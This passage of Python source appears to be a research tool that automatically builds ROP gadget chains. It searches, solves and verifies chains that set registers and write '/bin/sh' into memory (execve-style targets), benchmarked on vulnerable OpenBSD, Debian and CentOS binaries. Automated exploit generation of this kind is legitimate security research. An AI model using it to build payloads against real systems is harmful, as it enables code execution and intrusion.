                        if stop_event.is_set():break
                        if mode == 1:
                            f = True
                            for k1 in range(len(seq)):
                                g_if = tools.Analysis_gadget(gadgets_dict[seq[k1]])
                                for k3 in range(len(g_if['can_change_regs'])):
                                    if g_if['can_change_regs'][k3]['src_reg'] == 'rsp' and g_if['can_change_regs'][k3]['src_reg_type'] == 'value':
                                        f = False
                                        break
                                if not f: break
                            if not f: continue
                        logger.debug(seq)
                        for m in range(len(seq)):
                            logger.debug(gadgets_info_copy.gadgets_dict[seq[m]])
                        if sigle_gadget_chain_valid_solve(gadgets_info_copy,[seq],reg):
                            path_queue.put((reg, seq))

    def classify(timeout):
        start = time.time()
        while not stop_event.is_set():
            while not path_queue.empty():
                if time.time() - start > timeout:
                    stop_event.set()
                    worker_event.set()
                    return False
                if stop_event.is_set():
                    return False
                try:
                    (reg, seq) = path_queue.get(timeout=0.2)
                except queue.Empty:
                    continue
                if seq not in all_path[reg]:
                    all_path[reg].append(seq)
                normal_dict = {k: list(v) for k, v in all_path.items()}
                logger.debug(f"classify {normal_dict}")
    def sort_by_length(gadgets_dict, path_reg):
        path_dict = {}
        for i in range(len(path_reg)):
            length = 0
            for j in range(len(path_reg[i])):
                length += len(gadgets_dict[path_reg[i][j]].split(" ; "))
            path_dict[i] = [path_reg[i], length]
        sorted_items = sorted(path_dict.items(), key=lambda x: (x[1][1]))
        for k in range(len(sorted_items)):
            path_reg[sorted_items[k][0]]=sorted_items[k][1][0]
        return path_reg
    
    def solve(gadgets_info, timeout):
        gadgets_info_copy = copy.deepcopy(gadgets_info)
        start = time.time()
        while not stop_event.is_set():
            if time.time() - start > timeout:
                stop_event.set()
                worker_event.set()
                return False
            if all(len(v)!=0 for v in all_path.values()):
                reg_chain_list = []
                for r in range(len(target_regs)):
                    unique_tuples = set(tuple(lst) for lst in all_path[target_regs[r]])  # 生成器表达式转set
                    all_path[target_regs[r]] = manager.list([list(t) for t in unique_tuples])
                    if len(all_path[target_regs[r]]) > 15:
                        all_path[target_regs[r]] = sort_by_length(gadgets_info_copy.gadgets_dict, all_path[target_regs[r]])
                        all_path[target_regs[r]] = all_path[target_regs[r]][:15]
                    random.shuffle(all_path[target_regs[r]])
                    reg_chain_list.append(all_path[target_regs[r]][0])

                if reg_chain_list not in has_been_solved:
                    has_been_solved.append(reg_chain_list)
                                           
                    valid_gadget_seqs = get_valid_gadget_seq(reg_chain_list,gadgets_dict,controllable_reg,target_regs)
                    if len(valid_gadget_seqs) == 0:
                        continue
                    for i in range(len(valid_gadget_seqs)):
                        if stop_event.is_set():continue
                        # logger.debug(f"valid_gadget_seqs : {valid_gadget_seqs[i]}")
                        solve_res = solve_engine.solve(valid_gadget_seqs[i],gadgets_info_copy)
                        if not solve_res:
                            continue
                        else:
                            if stop_event.is_set():continue
                            solve_res_bak = solve_res.copy()
                            if not solve_engine.check(gadgets_info=gadgets_info_copy,solve_res=solve_res)[0]:
                                # continue # do experiment3
                                resolve_res = solve_engine.resolve(gadgets_info, solve_res)
                                if resolve_res:
                                    solve_res = resolve_res
                                    if stop_event.is_set():continue
                                    if solve_engine.check(gadgets_info=gadgets_info_copy,solve_res=solve_res)[0]:
                                        if stop_event.is_set():continue
                                        logger.debug(f"{Color.GREEN}{solve_res}{Color.RESET}")
                                        result.append([solve_res,valid_gadget_seqs[i]])
                                        stop_event.set()
                                        return True
                                # target_regs_bak = gadgets_info_copy.target_regs.copy()
                                for j in range(len(gadgets_info_copy.target_regs)):
                                    gadgets_info_copy.target_regs[j]['reg_value'] = gadgets_info_copy.target_regs[j]['reg_value']^0x11111111
                                solve_res_p = solve_engine.solve(valid_gadget_seqs[i],gadgets_info_copy)
                                for j in range(len(gadgets_info_copy.target_regs)):
                                    gadgets_info_copy.target_regs[j]['reg_value'] = gadgets_info_copy.target_regs[j]['reg_value']^0x11111111
                                resolve_res = solve_engine.resolve(gadgets_info_copy, solve_res_bak, solve_res_p)
                                if not resolve_res:
                                    continue
                                if solve_engine.check(gadgets_info_copy, resolve_res)[0]:
                                    if stop_event.is_set():continue
                                    logger.debug(f"{Color.GREEN}{resolve_res}{Color.RESET}")
                                    result.append([resolve_res,valid_gadget_seqs[i]])
                                    stop_event.set()
                                    return True
                                else:
                                    # gadgets_info_copy.target_regs = target_regs_bak
                                    continue
                            else:
                                if stop_event.is_set():continue
                                logger.debug(f"{Color.GREEN}{solve_res}{Color.RESET}")
                                result.append([solve_res,valid_gadget_seqs[i]])
                                stop_event.set()
                                return True
                else:
                    max_num = 1
                    for r in target_regs:
                        max_num = max_num * len(all_path[r])
                    if len(has_been_solved) == max_num and worker_event.is_set():
                        stop_event.set()
                        return False
        return False

    worker_threads = []
    monitor_threads = []
    solver_threads = []

    for reg in target_regs:
        for n in range(search_depth):
            # t = threading.Thread(target=worker, args=(gadgets_info,reg,n,), daemon=True)
            t = mp.Process(target=worker, args=(gadgets_info,reg,n,all_queue), daemon=True)
            t.start()
            worker_threads.append(t)
    
    for reg in target_regs:
        t = mp.Process(target=monitor, args=(gadgets_info,reg,all_queue, timeout), daemon=True)
        t.start()
        monitor_threads.append(t)
    
    classify_thread = mp.Process(target=classify, args=(timeout,), daemon=True)
    classify_thread.start()

    for k in range(len(target_regs)*2):
        t = mp.Process(target=solve, args=(gadgets_info,timeout,), daemon=True)
        t.start()
        solver_threads.append(t)

    classify_thread.join()
    
    for t in worker_threads:
        t.join()

    if len(result) == 0:
        worker_event.set()
        stop_event.set()

    for t in solver_threads:
        t.join()

    for t in monitor_threads:
        t.join()

    if len(result) > 0:
        return result
    else:
        return False
    
def info_init(binary,file_fold):
    global gadgets_info
    path_root = "/home/rop"
    gadgets_file = f"{path_root}/my-rop/benchmark_experiment/benchmark_gadget_folders/{file_fold}/{binary}.bin.txt"
    gadgets_data = tools.load_gadget(gadgets_file)
    gadgets_dict = tools.create_gadget_dict(gadgets_data)
    
    controllable_mem_file_dir = f'{path_root}/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/{file_fold}/{binary}/cyclic_matches.json'
    with open(controllable_mem_file_dir, "r", encoding="utf-8") as file:
        controllable_mem_data = json.load(file)
    controllable_mem_data = sorted(controllable_mem_data, key=lambda x: int(x['start_addr'], 16))
    controble_addr_base = int(controllable_mem_data[0]['start_addr'],16)
    (permission_table, regs_init) = tools.get_map_regs(f"{path_root}/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/{file_fold}/{binary}")
    controllable_regs = eval(open(f"{path_root}/my-rop/benchmark_experiment/benchmark_mem_reg_info_fold/{file_fold}/{binary}/controble_regs.txt",'r').read())
    binary_file = f'{path_root}/my-rop/benchmark_experiment/rop-benchmark/binaries/x86/reallife/vuln/{file_fold}/{binary}.bin'
    elf = ELF(binary_file,checksec=False)  # 加载目标二进制
    bss_address = elf.bss()  # 获取 .bss 段地址
    
    stack_pivot_chain = ['0x10000 -> ret']
    offset_list = [_ for _ in range(1000)]
    rsp_idx = (regs_init['rsp'] - controble_addr_base)//8
    offset_list.pop(0)
    offset_list.pop(0)
    offset_list.pop(0)
    address_map = {rsp_idx:"0xdeadbeef"}
    offset_list.pop(offset_list.index(rsp_idx))

    # target_regs = [{'reg_name':'rdi','reg_value':bss_address+0x300},{'reg_name':'rsi','reg_value':0},{'reg_name':'rdx','reg_value':0},{'reg_name':'rax','reg_value':59}]
    target_regs = [{'reg_name':'rdi','reg_value':bss_address+0x300},{'reg_name':'rsi','reg_value':0x1000},{'reg_name':'rdx','reg_value':7},{'reg_name':'rcx','reg_value':10}]
    # target_regs = [{'reg_name':'rdi','reg_value':0x41414000},{'reg_name':'rsi','reg_value':0x1000},{'reg_name':'rdx','reg_value':7},{'reg_name':'rcx','reg_value':50},{'reg_name':'r9','reg_value':0}]
    # target_regs = [{'reg_name':'rax','reg_value':59},{'reg_name':'rdx','reg_value':0}]
    # target_mem_value = [{bss_address+0x300:b"/bin/sh\x00"}]
    target_mem_value = []
    bss_address += 0x308
    gadgets_info = solve_engine.GadgetsInfo(gadgets_file,regs_init,stack_pivot_chain,gadgets_dict,address_map,offset_list,controllable_mem_data,controble_addr_base,target_regs,target_mem_value,controllable_regs,permission_table,bss_address)
    return gadgets_info

def sort_edges_condition(gadgets_info,edges):
    # 对edges进行排序
    have_condition = []
    have_no_condition = []
    for i in range(len(edges)):
        gadget = gadgets_info.gadgets_dict[edges[i]['addr']].split(" ; ")
        f = True
        for op in gadget:
            if op.split(" ")[0] in ['je', 'js', 'jle', 'ja', 'jg', 'jbe', 'jne']:
                have_condition.append(edges[i])
                f = False
                break
        if not f:
            continue
        have_no_condition.append(edges[i])
    have_no_mem = []
    for j in range(len(have_no_condition)):
        gadget = gadgets_info.gadgets_dict[have_no_condition[j]['addr']]
        gadget_info = tools.Analysis_gadget(gadget)
        n = 0
        for k in range(len(gadget_info['valid_mem_reg'])):
            if gadget_info['valid_mem_reg'][k]['reg_name'] != 'rsp':
                n += 1
        if n > 0:
            have_no_mem.append(have_no_condition[j])
    sorted_edges = have_no_mem# + have_condition
    return sorted_edges

def sort_edges(gadgets_info,edges):
    sorted_edges = []
    for i in range(len(edges)):
        edge = edges[i]
        gadget = gadgets_info.gadgets_dict[edge['addr']]
        if edge['src'] == 'immediate_num':
            edge['src_type'] = 2
        elif edge['src'] == 'rsp':
            edge['src_type'] = 0
        else:
            edge['src_type'] = 1
        
        if edge['rip'] == 'rsp':
            edge['rip_type'] = 0
        else:
            edge['rip_type'] = 1

        gadget_info = tools.Analysis_gadget(gadget)
        
        edge['can_change_reg_num'] = len(gadget_info['can_change_regs'])
        edge['condition_reg_num'] = len(gadget_info['condition_reg'])
        edge['valid_mem_reg_num'] = len(gadget_info['valid_mem_reg'])
        edge['gadget_len'] = len(gadget.split(" ; "))

        sorted_edges.append(edge)
    res = sorted(sorted_edges, key=lambda x: (x['rip_type'], x['src_type'], x['gadget_len'], x['can_change_reg_num'], x['valid_mem_reg_num'], x['condition_reg_num']))
    for i in range(len(res)):
        del res[i]['rip_type']
        del res[i]['src_type']
        del res[i]['can_change_reg_num']
        del res[i]['condition_reg_num']
        del res[i]['valid_mem_reg_num']
        del res[i]['gadget_len']
    return res
def main(binary, file_fold, gadgets_info = None, mem_search_depth=1, reg_search_depth=3, res_json={},valid_mem_reg_num=1,mem_reg_timeout=2*60,reg_timout=10*60):
    # global res_json
    if gadgets_info == None:
        gadgets_info = info_init(binary,file_fold)
    gadgets_dict = gadgets_info.gadgets_dict
    
    res_json['Target Register'] = gadgets_info.target_regs
    res_json['Target Memory'] = gadgets_info.target_mem_value
    controllable_reg = gadgets_info.controllable_regs
    # controllable_reg = ['rsp']
    target_regs = [_['reg_name'] for _ in gadgets_info.target_regs]
    logger.info(f"Get Set Reg Edges")
    edges = get_edges(gadgets_dict,controllable_reg,target_regs)
    if edges == None:
        return False
    edges = sort_edges(gadgets_info,edges)
    if edges == None:
        return False
    
    write_addr_data = gadgets_info.target_mem_value
    f = True
    regs_init_bak = gadgets_info.regs_init.copy()
    if len(write_addr_data) == 0:
        write = False
    else:
        write = True
    if write:
        logger.info(f"Find Write '/bin/sh' into Memory Gadget Chain")
        for w_i in range(len(write_addr_data)):
            for write_addr, write_data in write_addr_data[w_i].items():
                mem_write_time_start = time.time()
                (mem_write_solve,mem_write_chain) = get_mem_write_gadget_chain(gadgets_info,write_addr,write_data,search_depth=mem_search_depth,valid_mem_reg_num=valid_mem_reg_num,reg_timeout=mem_reg_timeout)
                # if mem_write_solve == False:
                #     (mem_write_solve,mem_write_chain) = get_mem_write_gadget_chain(gadgets_info,write_addr,write_data,search_depth=2)
                # mem_write_solve = {3: '0x0000000000439995', 4: '0xffffffffc7031738', 5: '0x330040b9c6', 6: '0x2f', 7: '0x0000000000410d82', 8: '0x0000003300439995', 9: '0xffffffffc7031739', 10: '0x330040b9c6', 11: '0x62', 12: '0x0000000000410d82', 13: '0x0000003300439995', 14: '0xffffffffc703173a', 15: '0x330040b9c6', 16: '0x69', 17: '0x0000000000410d82', 18: '0x0000003300439995', 19: '0xffffffffc703173b', 20: '0x330040b9c6', 21: '0x6e', 22: '0x0000000000410d82', 23: '0x0000003300439995', 24: '0xffffffffc703173c', 25: '0x330040b9c6', 26: '0x2f', 27: '0x0000000000410d82', 28: '0x0000003300439995', 29: '0xffffffffc703173d', 30: '0x330040b9c6', 31: '0x73', 32: '0x0000000000410d82', 33: '0x0000003300439995', 34: '0xffffffffc703173e', 35: '0x330040b9c6', 36: '0x68', 37: '0x0000000000410d82', 38: '0x0000003300439995', 39: '0xffffffffc703173f', 40: '0x330040b9c6', 41: '0x0', 42: '0x0000000000410d82', 43: '0xdeadbe01'}
                # mem_write_chain = []
                # for i,a in mem_write_solve.items():
                    # if '0x' + hex(eval(a)&0xffffffff)[2:].rjust(16,'0') in gadgets_dict:
                        # mem_write_chain.append('0x' + hex(eval(a)&0xffffffff)[2:].rjust(16,'0'))
                mem_write_time = time.time()-mem_write_time_start
                if mem_write_solve == False:
                    logger.error(f"Fail to write into memory!")
                    return False
                logger.success(f"Find Write into Memory Gadget Chain!")
                res_json['Memory Time'] = mem_write_time
                logger.success(f"Memory Time: {mem_write_time}")
                res_json['Memory Gadget Chain'] = mem_write_chain
                res_json['Memory Gadget Layout'] = mem_write_solve
                logger.success(f"{mem_write_solve}")
                # print(f"{Color.GREEN}{mem_write_solve}{Color.RESET}")
                # RES_LOG("LOG ")
                # exit()
    
        new_regs_states = solve_engine.get_regs_state(gadgets_info,mem_write_solve,0)
        # gadgets_info.after_mem_set_reg = solve_engine.get_regs_state(gadgets_info,mem_write_solve,1)
        gadgets_info.regs_init = new_regs_states
        init_permission_table = gadgets_info.permission_table.copy()

        gadgets_info.permission_table.append({'start':list(gadgets_info.target_mem_value[0].items())[0][0],'end':list(gadgets_info.target_mem_value[0].items())[0][0]+len(list(gadgets_info.target_mem_value[0].items())[0][1]),'permission':'r'})
    
    logger.info(f"Find Reg Setting Gadget Chain")
    logger.info(f"Target Register {[_['reg_name'] for _ in gadgets_info.target_regs]}")
    start = time.time()
    reg_res = get_valid_reg_chain_threads(gadgets_info,target_regs,edges,controllable_reg,gadgets_dict,search_depth=reg_search_depth,timeout=reg_timout,mode=1)
    # reg_res = [[{3: '0x000000000046f749', 4: '0x8ffffff00008', 5: '0x4a20eb', 6: '0x9000365ffe15', 2199023125903: '0x000000000040101a', 7: '0x0000000000401553', 8: '0x00000000004017d1', 2199023125902: '120', 9: '4290007111', 11: '0x470e60', 12: '0x000000000043351f', 13: '0', 14: '0x0000000000423825', 15: '59', 16: '0x40b5d7', 17: '0xdeadbe04'}, [['0x000000000046f749', '0x00000000004a20eb', '0x0000000000401553'], ['0x00000000004017d1', '0x0000000000470e60'], ['0x000000000043351f'], ['0x0000000000423825', '0x000000000040b5d7']]]]
    find_reg_time = time.time() - start
    if write:
        gadgets_info.permission_table = init_permission_table

    if not reg_res:
        logger.error(f"Fail to set register!")
        return reg_res
    
    logger.success(f"Find Set Registers Gadget Chain!")
    res_json['Register Time'] = find_reg_time
    logger.success(f"Register Time: {find_reg_time}")
    res_json['Register Gadget Chain'] = reg_res[0][1]
    res_json['Register Gadget Layout'] = reg_res[0][0]
    logger.success(f"{reg_res}")

    if write:
        for i in range(len(reg_res)):
            reg_solve = reg_res[i][0]
            reg_gadgets = reg_res[i][1]
            merge_solve = solve_engine.merge_gadgets(gadgets_info,[mem_write_chain,tools.trans_to_list(reg_gadgets)],[mem_write_solve,reg_solve],1)
            gadgets_info.regs_init = regs_init_bak
            reg_check = solve_engine.check(gadgets_info, merge_solve)
            # res_show(merge_solve, gadgets_info)
            if not reg_check[0]:
                logger.error(f"Reg Check Fail {reg_check}")
                # print(reg_check)
            else:
                mem_check = solve_engine.check_mem(gadgets_info, merge_solve)
                if not mem_check[0]:
                    logger.error(f"Memory Check Fail {mem_check}")
                    # print(mem_check)
                    return False
                else:
                    logger.success(f"Reg Check and Memory Check Success!")
                    res_json['All Gadget Chain'] = tools.trans_to_list([mem_write_chain,tools.trans_to_list(reg_gadgets)])
                    logger.success(f"{tools.trans_to_list([mem_write_chain,tools.trans_to_list(reg_gadgets)])}")
                    res_json['All Gadget Layout'] = merge_solve
                    logger.success(f"{merge_solve}")
                    # print(tools.trans_to_list([mem_write_chain,tools.trans_to_list(reg_gadgets)]))
                    # print(f"{Color.GREEN}{merge_solve}{Color.RESET}")
                    return (tools.trans_to_list([mem_write_chain,tools.trans_to_list(reg_gadgets)]),merge_solve)
    else:
        return (tools.trans_to_list(reg_res[0][1]),reg_res[0][0])
    return False

def res_show(solve_res, gadgets_info = None):
    sorted_dict = dict(sorted(solve_res.items()))
    for idx, value in sorted_dict.items():
        if "0x"+hex(eval(value)&0xffffffff)[2:].zfill(16) in gadgets_info.gadgets_dict:
            print(f"{idx} {'0x'+hex(eval(value)&0xffffffff)[2:].zfill(16)} {gadgets_info.gadgets_dict['0x'+hex(eval(value)&0xffffffff)[2:].zfill(16)]}")
        else:
            print(f"{idx} {value}")

class Color:
    BLUE = "\033[34m"   # 蓝色
    GREEN = "\033[32m"  # 绿色
    RED = "\033[31m"    # 红色
    RESET = "\033[0m"   # 重置颜色

def log_print(strings,log_filename):
    open(log_filename,'a').write(strings+"\n")
    print(strings)

def test(file_fold):
    global res_json 
    global stop_event
    binary_file_list = os.listdir(f"/home/rop/my-rop/benchmark_experiment/rop-benchmark/binaries/x86/reallife/vuln/{file_fold}")
    success = 0
    fail = 0
    logger.add(
    sink=f"benchmark_{file_fold}.log",  # 日志文件路径
    level="INFO",    # 关闭 DEBUG
    encoding="utf-8"
    )
    logger.info(f"Start Test {file_fold}")

    for b_i in range(len(binary_file_list)):
        b = binary_file_list[b_i]
        if b.endswith(".bin"):
            logger.info(f"Start Test {b}")
            res_json = {"binary":f"{file_fold}/{b}"}
            res_json["size(KB)"] = os.path.getsize(f"/home/rop/my-rop/benchmark_experiment/rop-benchmark/binaries/x86/reallife/vuln/{file_fold}/{b}")//1024
            start_time = time.time()
            # try:
            if main(b[:-4], file_fold, mem_search_depth=3, reg_searh_depth=3, valid_mem_reg_num=1):
                success += 1
                end_time = time.time()
                logger.success(f"{file_fold}/{b} Success!")
                res_json['All Time'] = end_time - start_time
                logger.success(f"All Time: {end_time - start_time}")
                logger.success(f"Success: {success} Fail: {fail}")
                logger.success(f"Res Json {res_json}")
            else:
                logger.error(f"{file_fold}/{b} No Result!")
                fail += 1
                logger.error(f"Success: {success} Fail: {fail}")

def debug(binary,file_fold):
    global gadgets_info
    info_init(binary,file_fold)
    # valid_gadget_seq = [['0x000000000041d8cb', '0x0000000000410495'], ['0x0000000000449d07', '0x00000000004396bf', '0x000000000043e87b'], ['0x000000000044a609', '0x000000000040aaef', '0x0000000000403f41'], ['0x00000000004011ad', '0x0000000000440974']]
    # gadgets_info.gadgets_dict['0x0000000000403f41'] = 'pop rsi ; push rax ; retf 5'
    # solve_res1 = solve_engine.solve(valid_gadget_seq,gadgets_info)
    # res_show(solve_res1, gadgets_info)
    # check = solve_engine.check(gadgets_info, solve_res1)
    seq = ['0x00000000004011ad', '0x000000000041244f', '0x000000000041616b']
    res = sigle_gadget_chain_valid_solve(gadgets_info,[seq],'rdx')
    pass
if __name__ == "__main__":
    debug("kill","openbsd-73")
    # test("centos-7.1810")
    # test("debian-10-cloud")
    # test("openbsd-62")
    # test("openbsd-64")
    # test("openbsd-65")
    # test("gcc_fzero")
    # test("openbsd-73")